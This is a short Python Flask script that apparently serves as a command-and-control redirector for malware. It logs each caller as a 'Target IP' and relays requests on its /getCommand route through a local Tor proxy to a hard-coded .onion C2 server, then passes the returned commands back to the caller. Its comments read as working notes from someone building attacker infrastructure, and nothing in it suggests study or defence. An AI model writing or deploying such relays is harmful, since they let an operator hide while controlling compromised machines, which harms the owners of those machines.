#!/usr/bin/python3
from flask import Flask, Response, request
import requests

app = Flask(__name__)

# .onion C2 server address - make sure this matches your PHP server
C2_ONION_URL = "http://5rnfvaokmf7dtplvgc6wislsikykqrtg7m67xfr2qncowecurevel5yd.onion/server.php"

# Route that will act as the redirector
@app.route('/getCommand', methods=['GET'])
def redirect_to_c2():
    try:
        # You can pass parameters if needed
        client_ip = request.remote_addr
        headers = {
            'User-Agent': request.headers.get('User-Agent', 'redirector'),
        }
        print(f"Target IP: {client_ip}")

        # FIXED: Correct proxy configuration
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        print(f"Redirecting request from {client_ip} to {C2_ONION_URL}")
        
        # Connection through Tor
        response = requests.get(
            C2_ONION_URL,
            headers=headers,
            proxies=proxies,
            timeout=30  # Increased timeout for Tor
        )

        print(f"Response from C2: Status {response.status_code}")
        
        return Response(
            response.content,
            status=response.status_code,
            content_type=response.headers.get('Content-Type', 'text/plain')
        )

    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return f"Error contacting C2 server: {str(e)}", 500
    except Exception as e:
        print(f"Unexpected error: {e}")
        return f"Unexpected error: {str(e)}", 500

# ADD THIS: Default route to avoid 404
@app.route('/')
def index():
    return """
    <h1>Tor Redirector Running</h1>
    <p>Access the C2 command at: <a href="/getCommand">/getCommand</a></p>
    <p>Or test with curl: <code>curl http://localhost:5000/getCommand</code></p>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)